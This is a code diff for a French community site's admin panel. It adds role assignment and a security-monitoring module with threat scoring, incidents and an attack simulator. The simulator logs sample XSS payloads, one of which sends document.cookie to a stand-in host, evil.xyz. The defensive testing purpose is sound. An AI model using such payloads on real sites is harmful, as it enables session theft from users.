+    const av=data.avatar_url?`<img src="${esc(data.avatar_url)}" style="width:100%;height:100%;object-fit:cover;border-radius:50%">`:`<span style="font-size:11px;font-family:var(--font-mono)">${init}</span>`;
+    const currentRole=ROLE_LABELS[data.role]||data.role||'membre';
+    const certBadge=data.is_certified?`<span style="font-size:10px;padding:1px 6px;background:rgba(200,200,216,.1);border:1px solid rgba(200,200,216,.2);border-radius:100px;font-family:var(--font-mono)">✦ certifié</span>`:'';
+    prev.innerHTML=`<div style="width:32px;height:32px;border-radius:50%;background:var(--bg3);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;flex-shrink:0;overflow:hidden">${av}</div><div><div style="font-size:13px;font-weight:500">@${esc(data.username)}</div><div style="font-size:11px;color:var(--text-muted);font-family:var(--font-mono)">${esc(currentRole)} ${certBadge}</div></div>`;
+  },400);
+}
+async function checkMemberRole(){
+  const username=getVal('check-role-username').trim();
+  const result=document.getElementById('check-role-result');
+  if(!result)return;
+  if(!username){result.textContent='Entre un pseudo.';result.style.color='rgba(200,80,80,.8)';return;}
+  const{data}=await db.from('profiles').select('username,role,is_certified,is_premium,premium_tier').eq('username',username).maybeSingle();
+  if(!data){result.textContent='Utilisateur introuvable.';result.style.color='rgba(200,80,80,.8)';return;}
+  const r=ROLE_LABELS[data.role]||data.role||'membre';
+  const prem=data.premium_tier==='devconnect-plus'?'DevConnect+':data.is_premium?'Dev+':'standard';
+  result.style.color='var(--text-secondary)';
+  result.innerHTML=`@${esc(data.username)}<br>Rôle : <strong style="color:var(--text)">${esc(r)}</strong><br>Premium : ${esc(prem)}${data.is_certified?' · <span style="color:#c8c8d8">✦ certifié</span>':''}`;
+}
+
 async function assignRole(){
   const username=getVal('role-username').trim();
-  const role=getVal('role-select');
-  const modoRoles=['responsable_modo','moderator_senior','moderator','moderator_junior','community_manager','content_manager','staff'];
+  const role=document.getElementById('role-select')?.value||'';
   if(!username){showToast('Entre un pseudo.','error');return;}
-  if(!modoRoles.includes(role)){showToast('Rôle invalide pour ce panel.','error');return;}
+  if(!role){showToast('Sélectionne un rôle dans le picker.','error');return;}
+  const modoRoles=['responsable_modo','moderator_senior','moderator','moderator_junior','community_manager','content_manager','staff','certified_dev','mentor'];
+  const allRoles=[...modoRoles,'architect','admin'];
+  if(!allRoles.includes(role)){showToast('Rôle non reconnu.','error');return;}
   const myLevel=getRoleLevel(currentProfile?.role);
   const targetLevel=getRoleLevel(role);
   if(targetLevel>=myLevel&&currentProfile?.role!=='architect'){
@@ -5709,6 +6259,8 @@ async function assignRole(){
   if(error){showToast('Erreur lors de la mise à jour.','error');return;}
   await writeAdminLog(`Rôle "${ROLE_LABELS[role]||role}" attribué à @${username}`,'role');
   showToast(`Rôle "${ROLE_LABELS[role]||role}" attribué à @${username} !`,'success');
+  const fb=document.getElementById('role-assign-feedback');
+  if(fb){fb.textContent=`✓ ${ROLE_LABELS[role]||role} → @${username}`;fb.style.color='#78c88a';}
 }
 
 // TICKETS DE MODÉRATION (vrais)
@@ -6019,6 +6571,41 @@ function showToast(msg,type='info'){const c=document.getElementById('toast-conta
 function setEl(id,v){const el=document.getElementById(id);if(el)el.textContent=v;}
 function setVal(id,v){const el=document.getElementById(id);if(el)el.value=v;}
 function getVal(id){return document.getElementById(id)?.value||'';}
+
+// ===== CUSTOM DROPDOWN (remplace les <select> natifs) =====
+// Construit un .cdrop à partir d'un tableau [{value,label}] ; conserve un <input type=hidden id=id> pour getVal()
+function buildCustomDropdown(id,options,selectedValue,opts={}){
+  const mono=opts.mono?' mono':'';
+  const sel=options.find(o=>o.value===selectedValue)||options[0]||{value:'',label:''};
+  const optsHtml=options.map(o=>`<div class="cdrop-option${o.value===sel.value?' selected':''}" data-value="${esc(o.value)}" onclick="selectCustomDropdown('${id}','${esc(o.value).replace(/'/g,"\\'")}')">${esc(o.label)}</div>`).join('');
+  return `<div class="cdrop${mono}" id="${id}-cdrop" data-id="${id}">
+    <input type="hidden" id="${id}" value="${esc(sel.value)}">
+    <div class="cdrop-trigger" tabindex="0" onclick="toggleCustomDropdown('${id}')" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();toggleCustomDropdown('${id}')}">
+      <span class="cdrop-trigger-label" id="${id}-label">${esc(sel.label)}</span>
+      <span class="cdrop-trigger-arrow"></span>
+    </div>
+    <div class="cdrop-menu">${optsHtml}</div>
+  </div>`;
+}
+function toggleCustomDropdown(id){
+  const el=document.getElementById(id+'-cdrop');if(!el)return;
+  const willOpen=!el.classList.contains('open');
+  document.querySelectorAll('.cdrop.open').forEach(d=>{if(d!==el)d.classList.remove('open');});
+  el.classList.toggle('open',willOpen);
+}
+function selectCustomDropdown(id,value){
+  const wrap=document.getElementById(id+'-cdrop');if(!wrap)return;
+  const hidden=document.getElementById(id);
+  const opt=wrap.querySelector(`.cdrop-option[data-value="${CSS.escape(value)}"]`);
+  if(hidden)hidden.value=value;
+  wrap.querySelectorAll('.cdrop-option').forEach(o=>o.classList.toggle('selected',o===opt));
+  const label=document.getElementById(id+'-label');
+  if(label&&opt)label.textContent=opt.textContent;
+  wrap.classList.remove('open');
+}
+document.addEventListener('click',e=>{
+  if(!e.target.closest('.cdrop'))document.querySelectorAll('.cdrop.open').forEach(d=>d.classList.remove('open'));
+});
 function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\"/g,'&quot;');}
 // Bloque les URLs javascript: data: vbscript: (XSS via href)
 function safeUrl(url){
@@ -6092,7 +6679,9 @@ function nexusEventClass(type){
   if(type.includes('xp'))return'xp';
   if(type.includes('register'))return'register';
   if(type.includes('rule'))return'rule';
-  if(type.includes('unsafe')||type.includes('security'))return'security';
+  if(type.includes('unsafe')||type.includes('security')||type.includes('injection')||type.includes('csrf'))return'security';
+  if(type.includes('brute')||type.includes('takeover')||type.includes('escalation')||type.includes('hijack')||type.includes('scraping'))return'ban';
+  if(type.includes('api')||type.includes('rotation')||type.includes('captcha')||type.includes('flood')||type.includes('impersonation'))return'spam';
   return'default';
 }
 function nexusSeverity(type){return NEXUS_SEVERITY[type]||'info';}
@@ -6327,7 +6916,7 @@ async function loadNexusRules(){
   </div>`).join('');
 }
 function nexusActionLabel(action){
-  return{alert_admin:"Alerter l'admin",flag:'Flagguer',warn:'Avertissement (log)'}[action]||action;
+  return{alert_admin:"Alerter l'admin",flag:'Flagguer',warn:'Avertissement (log)',create_incident:'Créer incident auto'}[action]||action;
 }
 async function createNexusRule(){
   const trigger=getVal('nrule-trigger');
@@ -6378,6 +6967,25 @@ async function nexusFireRule(rule,count){
   if(badge){badge.style.display='inline';badge.textContent='!';}
   if(_nexusSettingsCache.alerts!==false)nexusShowAlertToast({text,severity});
   if(document.getElementById('nexus-alerts')?.classList.contains('active'))loadNexusAlerts();
+  // Action spéciale : création d'incident automatique
+  if(rule.action==='create_incident'){
+    try{
+      await db.from('nexus_incidents').insert({
+        project_id:NEXUS_PROJECT_ID,
+        title:`[AUTO] ${nexusLabel(rule.trigger)} — seuil dépassé (${count}x)`,
+        description:`Règle Nexus déclenchée automatiquement. Event "${rule.trigger}" a atteint ${count} occurrences (seuil: ${rule.threshold}) sur 24h.`,
+        severity:severity,
+        category:rule.trigger.includes('brute')||rule.trigger.includes('login')?'brute_force':
+                 rule.trigger.includes('xp')?'xp_exploit':
+                 rule.trigger.includes('spam')?'spam':
+                 rule.trigger.includes('escalation')||rule.trigger.includes('role')?'suspicious_account':'other',
+        status:'open'
+      });
+      const incBadge=document.getElementById('nexus-incidents-badge');
+      if(incBadge)incBadge.textContent=parseInt(incBadge.textContent||0)+1;
+      if(document.getElementById('nexus-incidents')?.classList.contains('active'))loadNexusIncidents();
+    }catch(e){/* table nexus_incidents peut ne pas exister */}
+  }
 }
 function nexusShowAlertToast(alert){
   let cont=document.querySelector('.nexus-alert-toast');
@@ -6439,10 +7047,418 @@ function subscribeNexusRealtime(){
   try{
     nexusChannel=db.channel('nexus_logs_'+NEXUS_PROJECT_ID)
       .on('postgres_changes',{event:'INSERT',schema:'public',table:'nexus_logs',filter:'project_id=eq.'+NEXUS_PROJECT_ID},payload=>{
-        if(document.getElementById('section-nexus')?.classList.contains('active'))loadNexusOverview();
+        if(document.getElementById('section-nexus')?.classList.contains('active')){
+          loadNexusOverview();
+          if(document.getElementById('nexus-threats')?.classList.contains('active'))loadNexusThreatIntel();
+        }
       })
       .subscribe();
   }catch(e){/* realtime non dispo, silencieux */}
+}
+
+// ============================================================
+// NEXUS CYBER DEFENSE — v2.0
+// Threat Intel · Incidents · Tests · Risk Scoring
+// ============================================================
+
+// Extend NEXUS_SEVERITY & NEXUS_LABELS with new event types
+Object.assign(NEXUS_SEVERITY,{
+  privilege_escalation_attempt:'critical',
+  account_takeover_attempt:'critical',
+  data_scraping_detected:'critical',
+  brute_force_detected:'critical',
+  csrf_attempt:'high',
+  session_hijack_attempt:'high',
+  mass_report_abuse:'high',
+  api_abuse:'high',
+  profile_impersonation:'high',
+  suspicious_role_change:'high',
+  ip_rotation_detected:'medium',
+  captcha_bypass_attempt:'medium',
+  password_reset_flood:'medium',
+  content_injection_attempt:'high',
+});
+Object.assign(NEXUS_LABELS,{
+  privilege_escalation_attempt:'Escalade de privilèges',
+  account_takeover_attempt:'Prise de contrôle de compte',
+  data_scraping_detected:'Scraping de données',
+  brute_force_detected:'Brute Force détecté',
+  csrf_attempt:'Tentative CSRF',
+  session_hijack_attempt:'Hijacking de session',
+  mass_report_abuse:'Abus de signalement',
+  api_abuse:'Abus API',
+  profile_impersonation:'Usurpation de profil',
+  suspicious_role_change:'Changement de rôle suspect',
+  ip_rotation_detected:'Rotation d\'IP détectée',
+  captcha_bypass_attempt:'Bypass CAPTCHA',
+  password_reset_flood:'Flood réinitialisation mdp',
+  content_injection_attempt:'Injection de contenu',
+});
+
+// ── THREAT INTEL ──────────────────────────────────────────────
+async function loadNexusThreatIntel(){
+  const dayAgo=new Date(Date.now()-86400000).toISOString();
+  const{data:logs}=await db.from('nexus_logs').select('*').eq('project_id',NEXUS_PROJECT_ID).gte('created_at',dayAgo).order('created_at',{ascending:false});
+  const allLogs=logs||[];
+
+  // Brute force: group login_failed by hour windows
+  renderBruteForcePanel(allLogs);
+
+  // Anomaly detection
+  renderAnomalyPanel(allLogs);
+
+  // Risk scoring per user
+  await renderRiskScoring(allLogs);
+
+  // Live attack feed (hostile events only)
+  renderAttackFeed(allLogs);
+
+  // Update threats badge if critical events found
+  const criticalEvents=allLogs.filter(l=>['critical','high'].includes(l.severity||nexusSeverity(l.event_type)));
+  const badge=document.getElementById('nexus-threats-badge');
+  if(badge)badge.style.display=criticalEvents.length?'inline':'none';
+}
+
+function renderBruteForcePanel(logs){
+  const loginFails=logs.filter(l=>l.event_type==='login_failed'||l.event_type==='brute_force_detected');
+  // Group by hour
+  const byHour={};
+  loginFails.forEach(l=>{
+    const h=new Date(l.created_at).toLocaleTimeString('fr-FR',{hour:'2-digit',minute:'2-digit'});
+    byHour[h]=(byHour[h]||0)+1;
+  });
+  const groups=Object.entries(byHour).sort((a,b)=>b[1]-a[1]).slice(0,6);
+  const max=Math.max(...groups.map(g=>g[1]),1);
+  const el=document.getElementById('nexus-bf-list');
+  if(!el)return;
+  if(!groups.length){
+    el.innerHTML='<div style="text-align:center;padding:20px;color:rgba(255,255,255,.2);font-size:11px;font-family:var(--font-mono)">✓ Aucune activité brute force détectée</div>';
+    return;
+  }
+  el.innerHTML=groups.map(([time,count])=>{
+    const pct=Math.round((count/max)*100);
+    const color=count>=5?'#cc3333':count>=3?'#9a5a3a':'#7a8a6a';
+    return`<div class="nexus-bf-meter">
+      <div class="nexus-bf-ip" style="color:rgba(255,255,255,.4)">${esc(time)}</div>
+      <div class="nexus-bf-count" style="color:${color}">${count}</div>
+      <div class="nexus-bf-bar-wrap"><div class="nexus-bf-bar" style="width:${pct}%;background:${color}"></div></div>
+    </div>`;
+  }).join('');
+}
+
+function renderAnomalyPanel(logs){
+  const el=document.getElementById('nexus-anomaly-list');
+  if(!el)return;
+  // Compute anomaly scores
+  const anomalies=[];
+
+  const xpAttempts=logs.filter(l=>l.event_type?.includes('xp'));
+  if(xpAttempts.length>3)anomalies.push({label:'Farming XP détecté',count:xpAttempts.length,threshold:3,unit:'tentatives'});
+
+  const loginFails=logs.filter(l=>l.event_type==='login_failed');
+  if(loginFails.length>5)anomalies.push({label:'Flood authentification',count:loginFails.length,threshold:5,unit:'échecs'});
+
+  const unsafeUrls=logs.filter(l=>l.event_type==='unsafe_url_blocked');
+  if(unsafeUrls.length>2)anomalies.push({label:'Tentatives d\'injection URL',count:unsafeUrls.length,threshold:2,unit:'urls'});
+
+  const spamEvents=logs.filter(l=>l.event_type?.includes('spam'));
+  if(spamEvents.length>4)anomalies.push({label:'Activité spam anormale',count:spamEvents.length,threshold:4,unit:'events'});
+
+  const criticals=logs.filter(l=>nexusSeverity(l.event_type)==='critical');
+  if(criticals.length>2)anomalies.push({label:'Pic d\'events critiques',count:criticals.length,threshold:2,unit:'critiques'});
+
+  if(!anomalies.length){
+    el.innerHTML='<div style="text-align:center;padding:20px;color:rgba(255,255,255,.2);font-size:11px;font-family:var(--font-mono)">✓ Comportements normaux</div>';
+    return;
+  }
+  el.innerHTML=anomalies.map(a=>{
+    const ratio=a.count/a.threshold;
+    const cls=ratio>=3?'high':ratio>=2?'mid':'low';
+    return`<div class="nexus-anomaly-item">
+      <span class="nexus-sev ${cls==='high'?'critical':cls==='mid'?'high':'medium'}"></span>
+      <span class="nexus-anomaly-label">${esc(a.label)} <span style="color:rgba(255,255,255,.3);font-size:10px;font-family:var(--font-mono)">${a.count} ${a.unit}</span></span>
+      <span class="nexus-anomaly-score ${cls}">×${ratio.toFixed(1)}</span>
+    </div>`;
+  }).join('');
+}
+
+async function renderRiskScoring(logs){
+  const el=document.getElementById('nexus-risk-list');
+  if(!el)return;
+  // Score par user basé sur events 24h
+  const userScores={};
+  const WEIGHTS={critical:20,high:10,medium:4,info:1};
+  logs.forEach(l=>{
+    if(!l.user_ref)return;
+    const sev=l.severity||nexusSeverity(l.event_type);
+    userScores[l.user_ref]=(userScores[l.user_ref]||0)+(WEIGHTS[sev]||1);
+  });
+  const topUsers=Object.entries(userScores).sort((a,b)=>b[1]-a[1]).slice(0,8);
+  if(!topUsers.length){
+    el.innerHTML='<div style="text-align:center;padding:20px;color:rgba(255,255,255,.2);font-size:11px;font-family:var(--font-mono)">Aucun utilisateur à risque</div>';
+    return;
+  }
+  const userIds=topUsers.map(([id])=>id);
+  const userMap=await nexusFetchUsernames(userIds);
+  const maxScore=topUsers[0][1];
+  el.innerHTML=topUsers.map(([uid,raw])=>{
+    const score=Math.min(100,Math.round((raw/Math.max(maxScore,50))*100));
+    const cls=score>=70?'critical':score>=40?'high':score>=20?'mid':'low';
+    const color=score>=70?'#cc3333':score>=40?'#9a5a3a':score>=20?'#7a7a4a':'#4a8a5a';
+    return`<div class="nexus-risk-row">
+      <div class="nexus-risk-user" style="font-size:12px">@${esc(userMap[uid]||uid.substring(0,8)+'…')}</div>
+      <div class="nexus-risk-bar-wrap"><div class="nexus-risk-bar ${cls}" style="width:${score}%;background:${color}"></div></div>
+      <div class="nexus-risk-score" style="color:${color}">${score}</div>
+    </div>`;
+  }).join('');
+}
+
+function renderAttackFeed(logs){
+  const el=document.getElementById('nexus-attack-feed');
+  if(!el)return;
+  const hostile=['brute_force_detected','xp_exploit_blocked','unsafe_url_blocked','privilege_escalation_attempt',
+    'account_takeover_attempt','data_scraping_detected','csrf_attempt','session_hijack_attempt',
+    'spam_detected','xp_duplicate_attempt','content_injection_attempt'];
+  const attacks=logs.filter(l=>hostile.includes(l.event_type)||nexusSeverity(l.event_type)==='critical').slice(0,20);
+  if(!attacks.length){
+    el.innerHTML='<div style="text-align:center;padding:20px;color:rgba(255,255,255,.2);font-size:11px;font-family:var(--font-mono)">✓ Aucune attaque dans les dernières 24h</div>';
+    return;
+  }
+  el.innerHTML=attacks.map(l=>`<div class="nexus-attack-item">
+    <span class="nexus-sev ${l.severity||nexusSeverity(l.event_type)}"></span>
+    <span class="nexus-attack-type">${esc((l.event_type||'').replace(/_/g,' ').substring(0,18))}</span>
+    <span class="nexus-attack-detail">${esc(nexusLabel(l.event_type))}</span>
+    <span class="nexus-attack-time">${timeAgo(l.created_at)}</span>
+  </div>`).join('');
+}
+
+// ── INCIDENTS ─────────────────────────────────────────────────
+let _incidentsFilter='all';
+function nexusFilterIncidents(el,filter){
+  document.querySelectorAll('#nexus-incidents .filter-chip').forEach(c=>c.classList.remove('active'));
+  el.classList.add('active');
+  _incidentsFilter=filter;
+  loadNexusIncidents();
+}
+
+async function loadNexusIncidents(){
+  const el=document.getElementById('nexus-incidents-list');
+  if(!el)return;
+  el.innerHTML='<div style="text-align:center;padding:32px;color:rgba(255,255,255,.2);font-size:12px;font-family:var(--font-mono)">Chargement...</div>';
+  let query=db.from('nexus_incidents').select('*').eq('project_id',NEXUS_PROJECT_ID).order('created_at',{ascending:false});
+  if(_incidentsFilter!=='all')query=query.eq('status',_incidentsFilter);
+  const{data,error}=await query;
+  if(error){
+    // Table nexus_incidents peut ne pas exister encore — affiche un message d'info
+    el.innerHTML=`<div style="text-align:center;padding:32px;color:rgba(255,255,255,.2);font-size:12px;font-family:var(--font-mono)">Table nexus_incidents manquante — applique le SQL ci-dessous.<br><br><code style="font-size:10px;background:rgba(255,255,255,.04);padding:4px 8px;border-radius:4px">CREATE TABLE nexus_incidents(id uuid DEFAULT gen_random_uuid() PRIMARY KEY, project_id uuid, title text, description text, severity text, category text, status text DEFAULT 'open', created_at timestamptz DEFAULT now(), updated_at timestamptz DEFAULT now());</code></div>`;
+    return;
+  }
+  const incidents=data||[];
+  const badge=document.getElementById('nexus-incidents-badge');
+  const openCount=incidents.filter(i=>i.status==='open'||i.status==='investigating').length;
+  if(badge)badge.textContent=openCount||0;
+  if(!incidents.length){
+    el.innerHTML='<div style="text-align:center;padding:40px;color:rgba(255,255,255,.2);font-size:12px;font-family:var(--font-mono)">✓ Aucun incident enregistré</div>';
+    return;
+  }
+  el.innerHTML=incidents.map(inc=>{
+    const statusLabel={open:'Ouvert',investigating:'Investigation',resolved:'Résolu'}[inc.status]||inc.status;
+    const sevColor={critical:'#e07070',high:'#d0c060',medium:'#80a8e0',low:'rgba(255,255,255,.4)'}[inc.severity]||'rgba(255,255,255,.4)';
+    return`<div class="nexus-incident ${inc.status}">
+      <span class="nexus-incident-badge ${inc.status}">${esc(statusLabel)}</span>
+      <div style="flex:1">
+        <div class="nexus-incident-title">${esc(inc.title||'Sans titre')}</div>
+        <div class="nexus-incident-meta">${esc(inc.category||'')} · <span style="color:${sevColor}">${esc(inc.severity||'')}</span> · ${timeAgo(inc.created_at)}</div>
+        ${inc.description?`<div style="font-size:11px;color:rgba(255,255,255,.3);margin-top:4px;font-family:var(--font-mono)">${esc(inc.description.substring(0,120))}${inc.description.length>120?'…':''}</div>`:''}
+      </div>
+      <div class="nexus-incident-actions">
+        ${inc.status!=='resolved'?`<button class="btn btn-ghost btn-sm" onclick="updateIncidentStatus('${inc.id}','${inc.status==='open'?'investigating':'resolved'}')" style="font-size:11px">${inc.status==='open'?'Investiguer':'Résoudre'}</button>`:''}
+        <button class="btn btn-ghost btn-sm" onclick="deleteIncident('${inc.id}')" style="font-size:11px;color:#e08080">✕</button>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function openCreateIncidentModal(){
+  const modal=document.getElementById('nexus-incident-modal');
+  if(modal){modal.style.display='flex';}
+}
+function closeIncidentModal(){
+  const modal=document.getElementById('nexus-incident-modal');
+  if(modal)modal.style.display='none';
+}
+
+async function createIncident(){
+  const title=getVal('inc-title').trim();
+  if(!title){showToast('Un titre est requis.','error');return;}
+  const severity=getVal('inc-severity');
+  const category=getVal('inc-category');
+  const description=document.getElementById('inc-desc')?.value?.trim()||'';
+  try{
+    const{error}=await db.from('nexus_incidents').insert({
+      project_id:NEXUS_PROJECT_ID,title,description,severity,category,status:'open'
+    });
+    if(error)throw error;
+    showToast('Incident créé.','success');
+    await nexusLog('incident_created',currentUser?.id,{title:title.substring(0,80),severity});
+    closeIncidentModal();
+    loadNexusIncidents();
+  }catch(e){showToast('Erreur création incident. Vérifie que la table nexus_incidents existe.','error');}
+}
+async function updateIncidentStatus(id,status){
+  try{
+    await db.from('nexus_incidents').update({status,updated_at:new Date().toISOString()}).eq('id',id);
+    loadNexusIncidents();
+    showToast(`Incident marqué comme "${status}".`,'info');
+    await nexusLog('incident_updated',currentUser?.id,{incident_id:id,new_status:status});
+  }catch(e){showToast('Erreur mise à jour incident.','error');}
+}
+async function deleteIncident(id){
+  try{await db.from('nexus_incidents').delete().eq('id',id);loadNexusIncidents();}catch(e){}
+}
+
+// ── TESTS / SIMULATEUR ────────────────────────────────────────
+function initNexusTests(){
+  // Rien à init, le panel s'ouvre directement
+}
+
+function testLog(msg,type='info'){
+  const el=document.getElementById('nexus-test-console');
+  if(!el)return;
+  const line=document.createElement('div');
+  line.className=type;
+  const time=new Date().toLocaleTimeString('fr-FR');
+  line.textContent=`[${time}] ${msg}`;
+  el.appendChild(line);
+  el.scrollTop=el.scrollHeight;
+}
+function clearTestLog(){
+  const el=document.getElementById('nexus-test-console');
+  if(el)el.innerHTML='<span class="info">» Console effacée.</span>';
+}
+
+async function runNexusTest(scenario){
+  const scenarios={
+    brute_force:{
+      name:'Brute Force Attack',
+      events:[
+        {type:'login_failed',details:{email:'attacker@evil.com',ip:'192.168.1.42',attempt:1}},
+        {type:'login_failed',details:{email:'attacker@evil.com',ip:'192.168.1.42',attempt:2}},
+        {type:'login_failed',details:{email:'attacker@evil.com',ip:'192.168.1.42',attempt:3}},
+        {type:'login_failed',details:{email:'admin@devconnect.dev',ip:'10.0.0.99',attempt:1}},
+        {type:'login_failed',details:{email:'admin@devconnect.dev',ip:'10.0.0.99',attempt:2}},
+        {type:'login_failed',details:{email:'admin@devconnect.dev',ip:'10.0.0.99',attempt:3}},
+        {type:'login_failed',details:{email:'admin@devconnect.dev',ip:'10.0.0.99',attempt:4}},
+        {type:'brute_force_detected',details:{email:'admin@devconnect.dev',ip:'10.0.0.99',total_attempts:4,tag:'[TEST]'}},
+      ]
+    },
+    xp_farming:{
+      name:'XP Farming Attack',
+      events:[
+        {type:'xp_duplicate_attempt',details:{challenge_id:'ch_001',xp_attempted:500,tag:'[TEST]'}},
+        {type:'xp_exploit_blocked',details:{challenge_id:'ch_001',xp_attempted:500,reason:'duplicate',tag:'[TEST]'}},
+        {type:'xp_duplicate_attempt',details:{challenge_id:'ch_002',xp_attempted:1000,tag:'[TEST]'}},
+        {type:'xp_exploit_blocked',details:{challenge_id:'ch_002',xp_attempted:1000,reason:'rate_limit',tag:'[TEST]'}},
+        {type:'xp_exploit_blocked',details:{challenge_id:'ch_003',xp_attempted:2500,reason:'threshold_exceeded',tag:'[TEST]'}},
+      ]
+    },
+    spam_flood:{
+      name:'Spam Flood',
+      events:[
+        {type:'spam_detected',details:{content:'Buy cheap followers!!',channel:'general',tag:'[TEST]'}},
+        {type:'spam_detected',details:{content:'FREE CRYPTO GIVEAWAY',channel:'announcements',tag:'[TEST]'}},
+        {type:'spam_detected',details:{content:'Click here: hxxp://evil.tk',channel:'random',tag:'[TEST]'}},
+        {type:'spam_detected',details:{content:'Duplicate message flood x1',channel:'general',tag:'[TEST]'}},
+        {type:'spam_detected',details:{content:'Duplicate message flood x2',channel:'general',tag:'[TEST]'}},
+        {type:'spam_detected',details:{content:'Duplicate message flood x3',channel:'general',tag:'[TEST]'}},
+      ]
+    },
+    url_injection:{
+      name:'URL Injection',
+      events:[
+        {type:'unsafe_url_blocked',url:'javascript:alert(document.cookie)',tag:'[TEST]'},
+        {type:'unsafe_url_blocked',url:'data:text/html,\x3cscript\x3ealert(1)\x3c/script\x3e',tag:'[TEST]'},
+        {type:'content_injection_attempt',details:{payload:'\x3cimg src=x onerror=fetch("https://evil.xyz/"+document.cookie)\x3e',tag:'[TEST]'}},
+      ]
+    },
+    privilege_escalation:{
+      name:'Privilege Escalation',
+      events:[
+        {type:'suspicious_role_change',details:{from:'Membre',to:'Architect',by:'self',tag:'[TEST]'}},
+        {type:'privilege_escalation_attempt',details:{attempted_role:'Architect',blocked:true,tag:'[TEST]'}},
+        {type:'privilege_escalation_attempt',details:{attempted_role:'Administrateur',blocked:true,tag:'[TEST]'}},
+      ]
+    },
+    account_takeover:{
+      name:'Account Takeover Pattern',
+      events:[
+        {type:'login_failed',details:{email:'victim@devconnect.dev',attempt:1,tag:'[TEST]'}},
+        {type:'login_failed',details:{email:'victim@devconnect.dev',attempt:2,tag:'[TEST]'}},
+        {type:'login_failed',details:{email:'victim@devconnect.dev',attempt:3,tag:'[TEST]'}},
+        {type:'password_reset_flood',details:{email:'victim@devconnect.dev',resets_24h:4,tag:'[TEST]'}},
+        {type:'account_takeover_attempt',details:{email:'victim@devconnect.dev',confidence:'high',tag:'[TEST]'}},
+      ]
+    },
+    data_scraping:{
+      name:'Data Scraping Detection',
+      events:[
+        {type:'api_abuse',details:{endpoint:'/profiles',requests_per_min:300,tag:'[TEST]'}},
+        {type:'data_scraping_detected',details:{target:'profiles',records_accessed:500,time_window:'60s',tag:'[TEST]'}},
+        {type:'ip_rotation_detected',details:{ips_used:12,time_window:'5min',tag:'[TEST]'}},
+      ]
+    },
+  };
+
+  if(scenario==='full_attack'){
+    testLog('🚀 Lancement du scénario complet — 15 secondes...','info');
+    const allScenarios=['brute_force','xp_farming','spam_flood','url_injection','privilege_escalation','account_takeover','data_scraping'];
+    let i=0;
+    for(const s of allScenarios){
+      await new Promise(r=>setTimeout(r,i*2000));
+      runNexusTest(s);
+      i++;
+    }
+    return;
+  }
+
+  const sc=scenarios[scenario];
+  if(!sc){testLog('Scénario inconnu.','err');return;}
+
+  testLog(`▶ Lancement : ${sc.name}...`,'info');
+
+  let ok=0,fail=0;
+  for(const ev of sc.events){
+    await new Promise(r=>setTimeout(r,200));
+    try{
+      const userId=currentUser?.id||null;
+      const details={...(ev.details||{}),_test:true};
+      const{error}=await db.from('nexus_logs').insert({
+        project_id:NEXUS_PROJECT_ID,
+        user_ref:userId,
+        event_type:ev.type,
+        severity:nexusSeverity(ev.type),
+        details
+      });
+      if(error)throw error;
+      testLog(`  ✓ ${nexusLabel(ev.type)} → ${nexusSeverity(ev.type)}`,'ok');
+      ok++;
+    }catch(e){
+      testLog(`  ✗ ${ev.type} : ${e.message||'erreur'}`, 'err');
+      fail++;
+    }
+  }
+  testLog(`━━ ${sc.name} terminé : ${ok} OK · ${fail} erreurs`,'info');
+
+  // Déclencher la vérification des règles
+  if(ok>0){
+    setTimeout(async()=>{
+      const dayAgo=new Date(Date.now()-86400000).toISOString();
+      const{data}=await db.from('nexus_logs').select('*').eq('project_id',NEXUS_PROJECT_ID).gte('created_at',dayAgo);
+      if(data)checkNexusRules(data);
+      testLog('  → Règles Nexus vérifiées sur les nouveaux events.','info');
+      if(document.getElementById('nexus-threats')?.classList.contains('active'))loadNexusThreatIntel();
+    },1000);
+  }
 }
 
 // Valide qu'une couleur CSS est inoffensive (hex, rgb, hsl, var() seulement)
